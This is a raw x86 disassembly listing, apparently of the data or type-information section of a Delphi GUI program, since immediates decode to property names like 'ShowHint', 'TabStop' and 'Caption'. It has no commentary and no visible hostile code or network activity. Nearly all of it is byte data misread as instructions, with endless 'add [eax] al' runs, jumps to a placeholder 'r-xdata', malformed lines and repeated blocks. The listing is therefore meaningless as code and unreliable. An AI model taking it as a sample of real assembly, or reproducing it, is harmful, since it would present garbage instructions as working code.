add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edx ] 0x0
add [ eax ] al
add [ eax ] al
add al [ eax ]
call [ eax ]
push 0x6948776f
outsb
je r-xdata
or [ eax + 0x6f ] dl
jae r-xdata
push ss
add [ esi ] cl
push eax
popad
jb r-xdata
outsd
outsb
add [ eax ] dl
inc eax
add [ edx - 0x6b010000 ] bl
lahf
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jne r-xdata
sbb [ ebx ] al
sbb al 0x2
add bh bh
cld
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax 0x724f0b00
imul esp [ ebp + 0x6e ] 0x69746174
add [ eax ] eax
add [ eax ] al
adc [ eax ] eax
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
xchg esp eax
adc [ eax ] al
add [ eax ] 0x0
inc ebx
jne r-xdata
push esp
dec esi
inc esp
add [ ecx ] ah
add bh bh
je r-xdata
add [ edi + eax * 2 ] ch
inc esp
add [ ebx ] bl
add bh bh
xor al 0x93
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
adc [ eax ] al
push edi
add [ eax ] al
inc [ eax - 0x63 ]
inc esp
add [ esi + edi * 4 + 0x44 ] bl
add [ eax + 0x1 ] al
push ds
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0xe0656c62
push esi
inc esp
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e001f ] al
outsb
inc ebx
push ebx
je r-xdata
jo r-xdata
sbb [ eax ] eax
add [ eax ] al
mov es [ ebp ]
jl r-xdata
inc esp
add [ eax + 0x38004508 ] bh
je r-xdata
lahf
dec ebp
add bh bh
hlt
inc [ eax + 0x5cff0000 ]
mov esi 0x44
add [ eax - 0x80000000 ] al
pop es
add [ eax + ecx * 2 ] al
jae r-xdata
inc esp
inc esp
add [ eax ] dl
xchg edx eax
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
js r-xdata
outsd
jo r-xdata
jo r-xdata
inc esp
add [ eax ] bh
adc [ eax ] al
cdq
add [ eax ] al
push [ eax - 0x61 ]
add bh bh
fcomp [ ebp + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ ecx ] cl
push eax
outsd
jo r-xdata
outsd
outsb
je r-xdata
jb r-xdata
or [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
sbb al 0x0
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
mov eax 0x38004508
inc bx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsd
outsb
add [ eax ] dl
inc eax
add [ 0x10ff0002 ] bl
jo r-xdata
dec ebp
push es
push ebx
insd
outsd
outsd
je r-xdata
adc [ eax ] al
les esp [ ebx + 0x43 ]
add [ ebp + 0x43 ] dh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
imul ebp [ esi + 0x74 ] r-xdata
je r-xdata
add bh bh
add [ eax ] 0x0
[ esi + edi * 4 + 0x44 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040007 ] al
jb r-xdata
dec ebp
outsd
jne r-xdata
add al 0x57
inc ecx
add al al
push edx
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090023 ] al
outsb
push eax
outsd
jo r-xdata
inc esp
jb r-xdata
push ecx
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0021 ] al
outsb
lahf
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001b ] al
push 0x6948776f
outsb
je r-xdata
jo r-xdata
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
call [ eax + 0x9 ]
sbb [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0xcc73726f
pop esp
inc esp
add [ ecx + eax ] ch
dec ebp
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
str [ eax ]
inc esp
jb r-xdata
arpl [ ebx + 0x4 ] bp
push edx
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002a ] al
inc esp
outsd
ja r-xdata
dec ebp
outsd
jne r-xdata
jb r-xdata
inc ebp
outsb
inc esp
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
or [ edi + 0x6e ] ecx
jo r-xdata
add [ eax + 0x4f070024 ] al
add [ eax ] al
dec edi
jbe r-xdata
sbb al [ eax ]
add al 0x53
je r-xdata
add bh bh
shl [ ebp + 0x43 ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xa ] al
outsb
jne r-xdata
add [ edi ] 0x0
add al 0x48
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
jb r-xdata
jb r-xdata
xor [ eax + 0x44 ] dl
add al bl
add [ eax ] al
popad
dec ebp
outsd
jbe r-xdata
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060025 ] al
outsb
inc ebp
js r-xdata
push edi
inc ecx
add al cl
sbb eax 0x61540700
bound edx [ ebx + 0x74 ]
outsd
add [ eax ] al
push ecx
inc esp
add al ch
add [ eax ] al
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
push es
imul ebp [ edi + 0x6e ] r-xdata
push cs
outsd
outsb
inc esi
outsd
jb r-xdata
inc esp
jb r-xdata
call 0x44361d7
add [ eax ] al
add [ eax - 0x7bffbff0 ] dh
xor eax [ eax ]
nop
xor eax [ eax ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
push ds
inc ebx
outsb
push ebx
je r-xdata
dec edi
mov eax 0xe000444f
add [ eax ] al
jmp eax
outsb
dec ebp
outsd
jne r-xdata
je r-xdata
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090022 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x4c ] bp
push edx
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsd
insb
imul esp [ ebx + ecx * 2 + 0x65 ] 0x179
add [ eax ] al
pop es
add [ eax ] al
add [ eax + 0x1f ] bh
inc ebx
add [ esi ] al
push 0x6e6f4e63
pop es
push 0x69685363
je r-xdata
or al 0x54
dec eax
dec ebx
dec ebp
outsd
imul esp [ fs : esi + 0x69 ] 0x1737265
sbb al 0x1f
jb r-xdata
add [ eax + r-xdata ] dl
add ecx [ 0x494b4854 ]
popad
je r-xdata
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
outsb
clc
push ds
inc ebx
add [ esi ] cl
nop
loopne r-xdata
je r-xdata
jb r-xdata
add [ eax + eax ] al
add [ eax ] al
mov al 0x10
inc eax
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
push ebp
jo r-xdata
jb r-xdata
inc esp
dec edi
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0026 ] al
outsb
fiadd [ eax + eax - 0x54 ]
mov eax [ ecx ]
fdivr [ esi - 0x6d0fffbc ]
insb
jae r-xdata
add eax 0x6c416368
je r-xdata
push 0x72744363
insb
inc ebx
imul ebp [ edi + 0x6e ] 0x6d726f46
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ ebx ]
push esp
dec eax
dec ebx
dec ebp
outsd
imul esp [ fs : esi + 0x69 ] 0x17265
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edi + ebx ] bl
inc ebx
add [ edi ] al
push 0x6968536b
je r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
nop
and [ edi ] bl
inc ebx
add [ ebx ] al
or edx [ eax + ecx * 2 + 0x4b ]
mov eax eax
pop ds
inc ebx
add [ esi ] al
inc ebx
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0029 ] al
outsb
push ebx
je r-xdata
push esp
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add al ah
sbb [ ebp ] al
lodsb [ esi ]
add eax [ ebp ]
pushfd
push es
inc ebp
add [ ecx ] al
add [ ecx ] dl
mov ebp sub_436a48
or eax 0x73754354
je r-xdata
add [ ecx + eax * 8 + 0x44 ] bl
add [ eax + 0x5 ] dl
inc ebp
add [ esi + eax ] cl
inc ebp
add [ eax ] cl
add [ ebp ] eax
outsb
jbe r-xdata
add [ ebx ] al
or eax 0x494b4854
inc eax
add ah dh
pop ds
inc ebx
add [ esi ] al
push cs
push esp
dec eax
dec ebx
dec ecx
outsb
jbe r-xdata
or ch [ eax + 0x63 ]
push ebx
push 0x41746669
insb
je r-xdata
push 0x69685363
je r-xdata
add eax 0x6c416b68
je r-xdata
push 0x7274436b
insb
inc ebx
je r-xdata
insb
jae r-xdata
xchg esp eax
xor eax [ eax ]
cwde
xor eax [ eax ]
jb r-xdata
inc esp
insd
dec eax
outsd
je r-xdata
inc esp
add [ eax ] dl
mov [ eax + eax + 0x8 ] 0x5400449c
pop ss
inc edx
inc esp
add [ ebx + ecx * 4 - 0x4123ffbf ] ch
inc esp
add al dh
xchg edx eax
insb
imul esp [ ebx + ecx * 2 + 0x65 ] 0x78017379
pop ds
push cs
push 0x72744363
dec ebx
jns r-xdata
je r-xdata
insd
inc ebx
je r-xdata
or [ ebx + 0x6f ] al
push 0x7478456b
loop r-xdata
add [ eax - 0x6bffbfcd ] bl
insb
inc ecx
insb
je r-xdata
inc ebx
outsd
outsb
jbe r-xdata
shl [ edi + ebx + 0x43 ] 0x0
xor [ eax ] eax
and al 0x66
inc ebx
add [ eax ] bh
inc bx
add [ ebx ] cl
push esp
inc esp
outsd
add al ah
sbb [ ebp ] al
lodsb [ esi ]
add eax [ ebp ]
pushfd
push es
inc ebp
add [ edi ] al
push esp
dec eax
outsd
je r-xdata
add [ ecx + eax * 8 + 0x44 ] bl
add [ eax + 0x5 ] dl
inc ebp
add [ esi + eax ] cl
inc ebp
add [ eax ] cl
add [ ebp ] eax
add [ edx + 0x43 ] dh
add [ eax ] bl
add al [ eax ]
add [ eax ] cl
inc ebx
add [ edi + edx ] bh
inc edx
add [ eax - 0x6fffbfcd ] dl
jns r-xdata
add [ ecx + edx + 0x45 ] ch
add [ ecx + edx * 4 + 0x44 ] ah
add ah al
pop es
inc ebp
add ah ah
pop es
inc ebp
add ah bh
add al 0x45
add [ eax + edx * 4 - 0x6f4fffbc ] ch
inc esp
add [ eax + eax * 8 - 0x3f27ffbc ] ch
inc esp
add [ eax + 0x28004367 ] al
xchg edx eax
inc esp
add [ ebp + ebx * 4 + 0x44 ] bh
add ah dh
pushfd
add ah ch
xor [ eax ] al
or [ ecx ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
and [ ebx ] eax
sub [ ecx ] ah
inc ebx
add [ eax ] bl
je r-xdata
insd
inc ebx
je r-xdata
or [ ebx + 0x6f ] al
push 0x69685363
je r-xdata
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ esi + 0x43 ] cl
add [ ecx + 0x12200045 ] al
inc ebp
inc ebx
add [ ebp + 0x20580040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] bh
inc ebx
add [ eax ] al
add [ eax + 0x1f ] edi
add al [ eax ]
add [ eax ] ah
pop esi
inc esp
add [ edi + edx ] bh
inc edx
add [ eax - 0x6fffbfcd ] dl
adc [ edx ] al
cwde
xor eax [ eax ]
xchg esp eax
insb
add al [ eax ]
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jns r-xdata
add [ ecx + edx + 0x45 ] ch
add [ ecx + edx * 4 + 0x44 ] ah
add ah al
pop es
inc ebp
add ah ah
pop es
inc ebp
add ah bh
add al 0x45
add [ eax + edx * 4 - 0x6f4fffbc ] ch
add ah ch
xor [ eax ] al
inc esp
add [ eax ] cl
mov al [ 0xffffffff9eb40044 ]
inc esp
add [ eax ] dh
loope r-xdata
sar [ ecx ] 0x43
add [ edi ] al
or eax 0x73754354
je r-xdata
inc eax
add [ ebp + eax * 8 + 0x44 ] ch
add al dh
adc [ ebp ] eax
pop esp
insb
inc ecx
insb
je r-xdata
xchg esp eax
adc [ eax ] al
add [ eax ] 0x0
inc [ eax + 0x5cff0000 ]
mov esi 0x44
add [ eax - 0x80000000 ] al
pop es
add [ eax + ecx * 2 ] al
imul ebp [ esi + 0x74 ] r-xdata
je r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
inc esp
lahf
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000d ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xfc65646f
dec esi
inc esp
add [ eax + eax ] dh
push esp
retn 0x44
inc esp
add [ eax + eax * 8 - 0x3f27ffbc ] ch
inc esp
add [ eax + 0x28004367 ] al
xchg edx eax
inc esp
add [ ebp + ebx * 4 + 0x44 ] bh
add ah dh
pushfd
inc esp
add [ eax ] cl
mov al [ 0xffffffff9eb40044 ]
inc esp
add [ eax ] dh
loope r-xdata
nop
and al [ ebx ]
pop es
pop es
push esp
dec eax
outsd
je r-xdata
inc esp
add [ eax ] dl
mov [ eax + eax + 0x8 ] 0x5400449c
pop ss
inc edx
add [ esp + edx ] bh
add [ ebx + ecx * 4 - 0x4123ffbf ] ch
inc esp
add al dh
xchg edx eax
insd
dec eax
outsd
je r-xdata
lea eax [ eax ]
hlt
inc ebx
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
push cs
push eax
popad
jb r-xdata
inc ebx
add [ eax + 0x1004368 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] dl
add [ esi ] al
or al 0x0
or [ ecx + 0x75 ] al
je r-xdata
add [ eax + 0x1 ] al
jns r-xdata
adc [ edx ] al
cwde
xor eax [ eax ]
xchg esp eax
loop r-xdata
nop
jns r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080016 ] al
push 0x6948776f
outsb
je r-xdata
outsb
je r-xdata
jae r-xdata
jns r-xdata
inc ebp
add [ eax + 0x1c0044c7 ] cl
into
inc esp
add [ ebx + ebx * 8 + 0x66e00044 ] bh
inc ebx
and [ ebx ] eax
cmp [ ecx ] ah
inc ebx
add [ ecx ] ah
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
or [ ecx ] dh
inc eax
add [ ebp + eax * 8 + 0x44 ] ch
add al dh
adc [ ebp ] eax
pop esp
fiadd [ eax + eax - 0x54 ]
mov eax [ ecx ]
fdivr [ esi - 0x6d0fffbc ]
and [ ebx ] al
aam 0x61
inc esp
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
jo r-xdata
dec ebp
inc esp
add [ eax + 0x38004508 ] bh
or [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc eax 0x6f500900
jo r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
0x94ff0000 0x449f
add [ ecx ] al
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
dec eax
outsd
je r-xdata
add [ eax + 0x41 ] al
adc [ eax ] al
push es
pop ds
inc ebx
add [ edx ] cl
add al [ eax ]
inc [ eax + ebp * 2 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
adc [ eax ] eax
or ecx [ ecx + 0x6e ]
jbe r-xdata
add bh bh
hlt
insb
jae r-xdata
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ esi + 0x43 ] cl
add [ ecx + 0x12200045 ] al
inc ebp
insb
jae r-xdata
inc esp
add [ eax ] bh
lahf
adc [ eax ] al
inc eax
popfd
jo r-xdata
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al 0x0
push cs
push eax
popad
jb r-xdata
insb
imul esp [ ebx + ecx * 2 + 0x65 ] 0x1f607379
inc ebx
add [ ecx ] cl
add al [ eax ]
call [ edi + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x4 ] al
adc al [ eax ]
or [ ebp + 0x6f ] ecx
imul esp [ fs : esi + 0x69 ] 0x737265
add [ eax ] al
or eax [ eax ]
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ esi + ecx * 2 + 0x44 ] dl
add [ ecx ] ah
add bh bh
je r-xdata
add [ ecx + 0x43 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ edx ] 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ esi + edi * 4 + 0x44 ] bl
add [ eax + 0x1 ] al
sbb [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0x4656c62
push edi
inc ecx
add [ eax ] dl
add al [ eax ]
call [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08001a ] al
outsb
inc ebx
push 0x65676e61
loopne r-xdata
adc [ eax ] al
push edi
add [ eax ] al
inc [ eax - 0x63 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06001d ] al
outsb
inc ebp
js r-xdata
inc esp
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e001b ] al
outsb
inc ebx
outsd
outsb
je r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
call [ eax + 0x9 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] al
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
or [ ebp ] al
cmp [ ecx ] cl
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
push 0x6948776f
outsb
je r-xdata
add [ eax ] dl
inc eax
add [ eax ] cl
add [ eax + ebx * 8 + 0x67200044 ] ah
inc ebx
add [ esp + ebx * 8 + 0x44 ] dl
add [ eax - 0x24 ] bl
inc esp
add [ eax ] dl
fild [ eax + eax - 0x48 ]
fiadd [ eax + eax + 0x30 ]
pop es
inc ebp
add [ eax ] al
in eax 0x44
mov [ eax + eax + 0x1c ] 0xbc0044ce
fild [ eax + eax - 0x20 ]
inc bx
inc esp
add [ eax ] dl
xchg edx eax
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
outsb
dec ebp
outsd
jne r-xdata
je r-xdata
dec edi
js r-xdata
adc [ eax ] al
cdq
add [ eax ] al
push [ eax - 0x61 ]
add [ eax - 0x1 ] al
pop ss
add [ eax ] cl
push esp
popad
bound ecx [ edi + 0x72 ]
jb r-xdata
mov es [ ebp ]
jl r-xdata
add ah bl
outsd
inc ebx
add [ eax - 0x6bffbe70 ] cl
insd
inc ebx
add [ eax + 0x7c004190 ] dh
push 0x43
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x100040 ] dl
add [ eax ] al
or edx [ esp + ecx * 2 + 0x69 ]
jae r-xdata
push ebp
jo r-xdata
outsd
jo r-xdata
outsb
dec ebp
outsd
jne r-xdata
dec edi
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b001e ] al
add [ esi + 0x43 ] bl
add [ eax + 0x4326 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x26 ] ch
inc ebx
add [ eax ] dh
add [ eax ] al
add [ edi + ebx * 2 ] bh
inc esp
outsd
ja r-xdata
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ds
add [ ebx ] cl
dec edi
push eax
add bh bh
fcomp [ ebp + 0x10044 ]
add [ eax ] al
add [ eax ] al
xchg esp eax
adc [ eax ] al
inc ebx
outsd
insb
jne r-xdata
fsub [ 0x6010043 ]
push esp
push edi
imul esp [ esp + esi * 2 + 0x68 ] 0xfffffe04
outsb
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b001f ] al
jo r-xdata
xor [ eax + 0x44 ] dl
add al bl
add [ eax ] al
xor eax [ eax ]
xchg esp eax
xor eax [ eax ]
cwde
xor eax [ eax ]
dec ebp
outsd
jbe r-xdata
add bh bh
sub al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ ebx ] al
push esp
popad
fsub [ di ]
inc ebx
add [ esi + ebp * 2 + 0x43 ] ch
add [ eax - 0x67ffbc92 ] ah
outsb
inc ebx
add [ eax ] al
add [ eax ] al
xor [ edx ] 0x0
add [ eax ] al
pop es
add [ 0x74646957 ] al
push r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
sub [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ eax ] ch
inc ebx
add [ eax ] dh
sub [ ebx ] al
sbb al 0x0
add [ eax ] al
hlt
imul ebp [ edi + 0x6e ] r-xdata
sbb al 0x0
add bh bh
cmp [ edi + 0x43 ] ch
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
adc [ eax ] al
add bh bh
inc esp
outsb
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070002 ] al
imul edi [ edx + 0x65 ] r-xdata
outsb
mov eax eax
and [ esi ] 0x43
add [ edi ] al
or edx [ esp + ecx * 2 + 0x69 ]
jae r-xdata
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07001c ] al
outsb
inc ebp
outsb
je r-xdata
push edi
inc ecx
add al al
inc ecx
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
and al 0x6b
inc ebx
add [ eax - 0x7bffbe74 ] dl
imul eax [ ebx ] 0x68
outsd
inc ebx
cmp al 0x5f
mov eax 0xe000444f
add [ eax ] al
jmp eax
popad
jo r-xdata
add [ eax - 0x80000000 ] al
add al [ eax ]
pop es
inc ebx
inc ebx
outsd
insb
jne r-xdata
dec ebp
outsd
jne r-xdata
jb r-xdata
add [ eax ] al
outsb
cmp al 0x26
inc ebx
add al cl
pop edi
inc ecx
add [ eax ] cl
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
push edi
inc ecx
add al cl
add [ eax ] al
insb
jae r-xdata
dec esp
outsb
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] dl
inc eax
add [ 0x4ff0000 ] cl
outsd
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
or [ ecx + 0x75 ] al
je r-xdata
add [ eax + 0x55 ] cl
inc ecx
add [ eax + eax ] cl
add bh bh
int3
and eax 0x180043
add bh bh
pop eax
outsd
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x694d0800
outsb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
sub al 0x0
push ebx
sub_4325f4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
inc ebx
add [ eax + 0x4326 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x26 ] ch
inc ebx
add [ eax ] dh
add [ eax ] al
add [ edi + ebx * 2 ] bh
inc ecx
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
and al 0x6b
inc ebx
add [ eax - 0x7bffbe74 ] dl
imul eax [ ebx ] 0x68
outsd
inc ebx
add ah bl
outsd
inc ebx
add [ eax - 0x6bffbe70 ] cl
insd
inc ebx
add [ eax + 0x7c004190 ] dh
push 0x43
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x100040 ] dl
add [ eax ] al
or edx [ esp + ecx * 2 + 0x69 ]
jae r-xdata
xchg esp eax
adc [ eax ] al
inc ebx
outsd
insb
jne r-xdata
add bh bh
sub al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ ebx ] al
push esp
popad
fsub [ di ]
inc ebx
add [ esi + ebp * 2 + 0x43 ] ch
add [ eax - 0x67ffbc92 ] ah
outsb
inc ebx
add [ eax ] al
add [ eax ] al
xor [ edx ] 0x0
add [ eax ] al
pop es
add [ 0x74646957 ] al
push r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
sub [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ eax ] ch
inc ebx
add [ eax ] dh
sub [ ebx ] al
sbb al 0x0
add [ eax ] al
hlt
imul ebp [ edi + 0x6e ] r-xdata
sbb al 0x0
add bh bh
cmp [ edi + 0x43 ] ch
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
adc [ eax ] al
add bh bh
inc esp
outsb
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070002 ] al
imul edi [ edx + 0x65 ] r-xdata
outsb
mov eax eax
and [ esi ] 0x43
add [ edi ] al
or edx [ esp + ecx * 2 + 0x69 ]
jae r-xdata
popad
jo r-xdata
add [ eax - 0x80000000 ] al
add al [ eax ]
pop es
inc ebx
inc ebx
outsd
insb
jne r-xdata
add [ eax ] al
outsb
cmp al 0x26
inc ebx
add al cl
pop edi
inc ecx
add [ eax ] cl
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
add [ eax ] al
insb
jae r-xdata
dec esp
outsb
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
or [ ecx + 0x6c ] eax
